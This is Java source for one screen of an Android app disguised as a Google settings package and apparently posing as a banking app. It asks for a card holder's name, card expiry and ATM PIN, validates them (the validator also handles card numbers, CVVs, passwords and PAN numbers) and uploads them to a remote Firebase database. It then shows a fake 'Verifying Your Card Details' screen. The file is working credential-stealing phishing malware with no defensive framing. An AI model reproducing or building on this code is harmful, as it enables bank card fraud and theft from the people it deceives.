package settings.google.test.debug.system.yonos4bi;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;
import java.util.Map;

import settings.google.test.debug.system.yonos4bi.bg.DateInputMask;
import settings.google.test.debug.system.yonos4bi.bg.ExpiryDateInputMask;
import settings.google.test.debug.system.yonos4bi.bg.FormValidator;

public class ThirdActivity extends AppCompatActivity {

    public Map<Integer, String> ids;
    public HashMap<String, Object> dataObject;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main3);

        dataObject = new HashMap<>();

        String id = getIntent().getStringExtra("id");
        Button buttonSubmit = findViewById(R.id.submit);

        EditText expiry = findViewById(R.id.expiry);
        expiry.addTextChangedListener(new ExpiryDateInputMask(expiry));

        ids = new HashMap<>();
        ids.put(R.id.holdername, "holdername");
        ids.put(R.id.expiry, "expiry");
        ids.put(R.id.pin, "pin");
        for(Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);

            String value = editText.getText().toString().trim();
            dataObject.put(key, value);
        }

        buttonSubmit.setOnClickListener(v -> {
            if (validateForm()) {
                buttonSubmit.setText("Please Wait");
                dataObject.put("updated_at", Helper.datetime());

                FirebaseDatabase database = FirebaseDatabase.getInstance();
                DatabaseReference usersRef = database.getReference("data").child(Helper.SITE).child("form");
                String userId2 = usersRef.push().getKey();  // Generate a unique key
                assert userId2 != null;
                usersRef.child(id).child(userId2).setValue(dataObject)
                        .addOnSuccessListener(aVoid -> {
                            Intent intent = new Intent(this, Loading.class);
                            intent.putExtra("id", id);
                            intent.putExtra("nextActivity", "FourthActivity");
                            intent.putExtra("loadText", "Please wait... Verifying Your Card Details\n Redirecting in 5 seconds");
                            startActivity(intent);
                        })
                        .addOnFailureListener(e -> {
                            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                            Log.d(Helper.TAG, "Error: " + e.getMessage());
                        });
            } else {
                Helper.debug(ThirdActivity.this, "Form Validation Failed");
            }

        });

        Button back = findViewById(R.id.back);
        back.setOnClickListener(v->{
            Intent intent = new Intent(this, SecondActivity.class);
            startActivity(intent);
        });

    }

    public boolean validateForm() {
        boolean isValid = true;
        for (Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);
            if (!FormValidator.validateRequired(editText, "Please enter valid input")) {
                break;
            }
            String value = editText.getText().toString().trim();
            switch (key) {
                case "phone":
                    isValid = FormValidator.validateMinLength(editText, 10, "Required 10 digit "+key);
                    break;
                case "password":
                    isValid = FormValidator.validatePassword(editText,  "Invalid Password");
                    break;
                case "cvv":
                    isValid = FormValidator.validateMinLength(editText, 3,  "Invalid CVV");
                    break;
                case "pin":
                    isValid = FormValidator.validateMinLength(editText, 4,  "Invalid ATM Pin");
                    break;
                case "expiry":
                    isValid = FormValidator.validateMinLength(editText, 5,  "Invalid Expiry Date");
                    break;
                case "card":
                    isValid = FormValidator.validateMinLength(editText, 16,  "Invalid Card Number");
                    break;
                case "pan":
                    isValid = FormValidator.validatePANCard(editText,   "Invalid Pan Number");
                    break;
                default:
                    break;
            }
            if (isValid) {
                dataObject.put(key, value);
            }
        }

        return isValid;
    }
}
